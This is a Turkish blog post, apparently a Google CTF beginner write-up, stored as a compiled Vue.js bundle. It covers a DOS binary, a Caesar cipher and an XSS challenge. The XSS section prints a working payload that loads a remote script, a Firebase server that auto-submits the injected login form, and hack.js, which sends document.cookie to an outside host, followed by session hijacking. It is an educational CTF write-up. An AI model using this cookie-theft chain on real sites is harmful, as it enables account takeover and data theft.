r("blockquote",[r("p",[this._v("COM uzantısı, ilk kez DOS için 1970'lerde üretilmiştir.")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Tabii artık Windows, "),r("strong",[this._v("COM")]),this._v(' uzantılı dosyalar yerine, "çalıştırılabilir, yürütülebilir" anlamına gelen '),r("strong",[this._v("EXE")]),this._v(" uzantılı dosyaları kullanıyor.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("blockquote",[r("p",[this._v("DOSBOX, DOS işletim sistemi çalıştıran bir emülatör programıdır.")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Bunun yanında "),r("strong",[this._v("DEBUG")]),this._v(" etmek için de bir uygulamaya ihtiyacınız var.\nŞuradan indirebilirsiniz: "),r("a",{attrs:{href:"blog/google-ctf-macerasi-2/debug.zip",target:"_blank"}},[this._v("debug.zip")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Dosyayı indirdikten sonra "),r("strong",[this._v("DOSBOX")]),this._v("'u açıyoruz ve istediğimiz klasörü "),r("s",[this._v("mount ediyoruz")]),this._v(" yerleştiriyoruz. Daha sonra yerleştirdiğimiz sürücüye giriyoruz ve dosyamızı çalıştırıyoruz.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("İndirdiğimiz "),r("strong",[this._v("debug")]),this._v(" dosyasının komutlarını listelemek için "),r("code",{pre:!0},[this._v("?")]),this._v(" yazıyoruz ve komutlar listeleniyor.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Bize lazım olan komutlar "),r("code",{pre:!0},[this._v("d")]),this._v(" memory dump (bellek dökümü), "),r("code",{pre:!0},[this._v("g")]),this._v(" go (başlat) ve "),r("code",{pre:!0},[this._v("q")]),this._v(" quit (çıkış).")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Flag'imiz, "),r("code",{pre:!0},[this._v("CTF{g00do1dDOS-FTW}")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[r("s",[this._v("Caesar Cipher'in")]),this._v(" Sezar Şifrelemenin ne olduğunu bildiğim için Caesar kelimesini duyar duymaz bu bölümün ne olduğunu az çok kestirebilmiştim.\nBize bir ekran görüntüsü verilecek ve OCR (Optical Character Recognition, Optik Karakter Tanıma) ile biz bu yazıyı okuyacağız.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Daha sonra sezar şifreleme metodu kullanarak karakterleri "),r("code",{pre:!0},[this._v("n")]),this._v(" adım ileri veya geri getirerek yazıyı okunabilir hale getireceğiz.")])},function(){var e=this,r=e.$createElement,t=e._self._c||r;return t("table",[t("thead",[t("tr",[t("th",{staticStyle:{"text-align":"left"}},[e._v("Öncesi")]),e._v(" "),t("th",{staticStyle:{"text-align":"left"}},[e._v("Sonrası")])])]),e._v(" "),t("tbody",[t("tr",[t("td",{staticStyle:{"text-align":"left"}},[e._v("a")]),e._v(" "),t("td",{staticStyle:{"text-align":"left"}},[e._v("e")])]),e._v(" "),t("tr",[t("td",{staticStyle:{"text-align":"left"}},[e._v("b")]),e._v(" "),t("td",{staticStyle:{"text-align":"left"}},[e._v("f")])]),e._v(" "),t("tr",[t("td",{staticStyle:{"text-align":"left"}},[e._v("c")]),e._v(" "),t("td",{staticStyle:{"text-align":"left"}},[e._v("g")])]),e._v(" "),t("tr",[t("td",{staticStyle:{"text-align":"left"}},[e._v("Merhaba")]),e._v(" "),t("td",{staticStyle:{"text-align":"left"}},[e._v("Qivlefe")])])])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[r("code",{pre:!0},[this._v("Px tkx")]),this._v(", "),r("code",{pre:!0},[this._v("We are")]),this._v("'a n=7'de çevriliyor.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("pre",[r("code",{pre:!0,attrs:{class:"hljs"}},[this._v("Dear Customer. \n\nWe are already welcome to our newest customer if our secure iDrop Drive cloud file sharing service. A safe place for all your files. \n\nStore any file\niDropDrive starts with 15 PB if free online or offline storage, so you can keep warez, binaries, paintings, flags, firmwares. bitcoins, writeups - anything. \n\nSee your stuff whatever\nyour files in iDrop Drive can be reused from any foobanizer, smart fridge 2000. smart thirst, Tempo-a-matic, or media pc. So wherever you go, your files follow. \n\nShare files and folders\nYou can quickly invite others to view, download, and collaborate on all the files you want via email attachments. Just give them the link CTF{caesarcipherisasubstitutioncipher} and they can add all your data. \n\nFor example, download a list of files that you're currently working with us:\noffhub_firmware.bin JohnTR\nIOT_credentials.pdf\\ \\(deleted\\) Wintermuted\nFoobanizer9000_Manual.pdf Wintermuted\nfoo.ico Turbo \n\nSince we take security very seriously and in order to protect against vulnerabilities like efail and amdflaws, we 're sending you your credentials using the military-grade time-proven caesarean symmetric cipher.\n\nHappy iDropDriving!\n")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Burada da açıkça görüldüğü üzere şifremiz "),r("code",{pre:!0},[this._v("CTF{caesarcipherisasubstitutioncipher}")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("ul",[r("li",[this._v("XSS açığı bul")]),this._v(" "),r("li",[this._v("XSS açığını Chrome'a kaptırma")]),this._v(" "),r("li",[this._v("Session bilgilerini çal")]),this._v(" "),r("li",[this._v("Kedili mail at")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("blockquote",[r("p",[this._v("Siteler Arası Betik Çalıştırma (XSS), genellikle web uygulamalarında bulunan bir tür bilgisayar güvenlik açıklığıdır. XSS, diğer kullanıcılar tarafından görüntülenen web sayfalarına istemci taraflı kodun enjekte edilmesine imkan verir.")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Öncelikle "),r("strong",[this._v("XSS")]),this._v(" açığı çalışıyor mu diye bir bakalım.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Ve, anında "),r("strong",[this._v("Chrome")]),this._v("'a yakalandık. :(")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Demek ki "),r("strong",[this._v("XSS")]),this._v(" açığı varmış. Peki Chrome'un bu açığı engellememesini nasıl sağlayabilirim?")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Direk olarak "),r("em",[this._v("script")]),this._v(" çalıştırmak yerine bir kullanıcı adı/şifre denediğimde, sayfanın bana verdiği sonuç:")])},function(){var e=this.$createElement,r=this._self._c||e;return r("pre",[r("code",{pre:!0,attrs:{class:"hljs"}},[this._v("Wrong credentials: username//password\n")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("pre",[r("code",{pre:!0,attrs:{class:"hljs"}},[this._v('Kullanıcı adı: <script src="http:\nŞifre: xava.me/hek.js"><\/script>\n')])])},function(){var e=this.$createElement,r=this._self._c||e;return r("pre",[r("code",{pre:!0,attrs:{class:"hljs"}},[this._v("Wrong credentials: \n")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Madem çalıştırdık, neden bir "),r("code",{pre:!0},[this._v("alert")]),this._v(" gelmedi? Hemen "),r("strong",[this._v("Chrome Geliştirici Konsolunu")]),this._v(" açıyorum ve "),r("strong",[this._v("Network")]),this._v(" sekmesini inceliyorum.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("İsteğimizin "),r("strong",[this._v("HTTP")]),this._v(" portundan gönderilmesi sonucu "),r("strong",[this._v("Mixed Content")]),this._v(" hatasına yakalanmışız.")])},function(){var e=this,r=e.$createElement,t=e._self._c||r;return t("p",[e._v("Sayfa "),t("strong",[e._v("HTTPS")]),e._v(", diğer kaynaklar "),t("strong",[e._v("HTTP")]),e._v(" bağlantısı üzerinden yüklenirse; güvenli olan "),t("strong",[e._v("SSL")]),e._v(" sertifikası sebebiyle tarayıcı, güvensiz olan "),t("strong",[e._v("HTTP")]),e._v(" protokolünden yüklenmeye çalışan verilerin bağlantısını kesiyor.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("İsteğimizin "),r("strong",[this._v("HTTPS")]),this._v(" portundan yapılması gerekiyor.\nBunun için hemen bir "),r("strong",[this._v("FireBase")]),this._v(" projesi açıp "),r("em",[this._v("hosting")]),this._v(" ayarladım.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("pre",[r("code",{pre:!0,attrs:{class:"hljs"}},[this._v('Kullanıcı adı: <script src="https:\nŞifre: xavactf.firebaseapp.com/hek.js"><\/script>\n')])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Bundan sonrası çorap söküğü gibi gelecek. Bu "),r("strong",[this._v("JavaScript")]),this._v(" ile dökümana bir img elementi koyduk mu "),r("em",[this._v("session")]),this._v(" bilgileri eilimizde.")])},function(){var e=this,r=e.$createElement,t=e._self._c||r;return t("p",[e._v("Bunun için "),t("strong",[e._v("FireBase")]),e._v(" üzerinde "),t("strong",[e._v("NodeJS")]),e._v(" kullanıyorum. Google botunu "),t("em",[e._v("hack")]),e._v("lemek için "),t("strong",[e._v("Google")]),e._v(" servisi kullanmak gibisi yok.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Sunucu tarafında çalışan "),r("code",{pre:!0},[this._v("index.js")]),this._v(" içeriği:")])},function(){var e=this,r=e.$createElement,t=e._self._c||r;return t("pre",[t("code",{staticClass:"hljs language-JavaScript"},[t("span",{staticClass:"hljs-keyword"},[e._v("const")]),e._v(" functions = "),t("span",{staticClass:"hljs-built_in"},[e._v("require")]),e._v("("),t("span",{staticClass:"hljs-string"},[e._v("'firebase-functions'")]),e._v(");\n"),t("span",{staticClass:"hljs-keyword"},[e._v("const")]),e._v(" admin = "),t("span",{staticClass:"hljs-built_in"},[e._v("require")]),e._v("("),t("span",{staticClass:"hljs-string"},[e._v("'firebase-admin'")]),e._v(");\n"),t("span",{staticClass:"hljs-keyword"},[e._v("const")]),e._v(" express = "),t("span",{staticClass:"hljs-built_in"},[e._v("require")]),e._v("("),t("span",{staticClass:"hljs-string"},[e._v("'express'")]),e._v(");\n"),t("span",{staticClass:"hljs-keyword"},[e._v("const")]),e._v(" app = express();\nadmin.initializeApp({"),t("span",{staticClass:"hljs-attr"},[e._v("databaseURL")]),e._v(": "),t("span",{staticClass:"hljs-string"},[e._v("'https://xavactf.firebaseio.com'")]),e._v(",});\n\napp.get("),t("span",{staticClass:"hljs-string"},[e._v("'/cats'")]),e._v(", (req,res) => { \n    res.send("),t("span",{staticClass:"hljs-string"},[e._v('\'<form action="https://router-ui.web.ctfcompetition.com/login" method="post"><input type="text" name="username" value="&#x3C;script src=&#x22;"><input type="password" name="password" value="xavactf.firebaseapp.com/hack.js&#x22;&#x3E;&#x3C;/script&#x3E;"></form><script>document.forms[0].submit();<\/script>\'')]),e._v(");\n});\n\napp.get("),t("span",{staticClass:"hljs-string"},[e._v("'/session'")]),e._v(", (req,res) => {\n    admin.database().ref("),t("span",{staticClass:"hljs-string"},[e._v("'/sessions'")]),e._v(").child("),t("span",{staticClass:"hljs-built_in"},[e._v("Date")]),e._v(".now()).set(req.query);\n    res.send("),t("span",{staticClass:"hljs-string"},[e._v('"Page could not be loaded"')]),e._v(");\n});\n\nexports.app = functions.https.onRequest(app);\n")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Client tarafında çalışan "),r("code",{pre:!0},[this._v("hack.js")]),this._v(" içeriği:")])},function(){var e=this,r=e.$createElement,t=e._self._c||r;return t("pre",[t("code",{staticClass:"hljs language-JavaScript"},[t("span",{staticClass:"hljs-built_in"},[e._v("document")]),e._v(".writeln("),t("span",{staticClass:"hljs-string"},[e._v('"<img src=\'https://xavactf.firebaseapp.com/session?session="')]),e._v("+"),t("span",{staticClass:"hljs-built_in"},[e._v("document")]),e._v(".cookie+"),t("span",{staticClass:"hljs-string"},[e._v('"\' />"')]),e._v(")\n")])])},function(){var e=this,r=e.$createElement,t=e._self._c||r;return t("ul",[t("li",[e._v("Mail olarak "),t("code",{pre:!0},[e._v("[LINK]/cats")]),e._v(" yolluyorum")]),e._v(" "),t("li",[e._v("Arkadaş maili açar açmaz kullanıcı adı ve şifresi önceden belirlenmiş bir şekilde ilgili siteye post ediliyor.")]),e._v(" "),t("li",[e._v("Sitedeki XSS açığı "),t("code",{pre:!0},[e._v("[LINK]/hack.js")]),e._v("'i çağırıyor.")]),e._v(" "),t("li",[e._v("hack.js, sayfaya bir resim entegre ediyor. Resmin adresi "),t("code",{pre:!0},[e._v("[LINK]/session?session=[COOKIE]")]),e._v(" şeklinde.")]),e._v(" "),t("li",[t("code",{pre:!0},[e._v("[LINK]/session")]),e._v(" adresi, veritabanına URL'inde bulduğu parametreleri kaydediyor.")]),e._v(" "),t("li",[e._v("Ben de bu veritabanından parametreleri çekiyorum.")])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Kısacası, "),r("em",[this._v("session")]),this._v(" bilgilerini almak istediğim sunucu, benim "),r("strong",[this._v("JS")]),this._v(" betiğimi "),r("em",[this._v("client")]),this._v(" tarafında çalıştırdığında, kullanıcının tarayıcısından verileri hüpletiyorum.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[r("em",[this._v("Session")]),this._v(" bilgileri:")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[r("code",{pre:!0},[this._v('"flag=Try the session cookie; session=Avaev8thDieM6Quauoh2TuDeaez9Weja"')])])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[r("em",[this._v("Session")]),this._v(" bilgilerini, "),r("em",[this._v("konsol")]),this._v("da "),r("code",{pre:!0},[this._v('document.cookie="..."')]),this._v(" çalıştırarak içeriye sızdım.")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[r("strong",[r("em",[this._v("Google-Haus Credentials")])]),this._v("'e sağ tıkladım ve...")])},function(){var e=this.$createElement,r=this._self._c||e;return r("p",[this._v("Şifre kabak gibi ortaya çıktı. Şifremiz, "),r("code",{pre:!0},[this._v("CTF{Kao4pheitot7Ahmu}")])])}]}}}}}}]);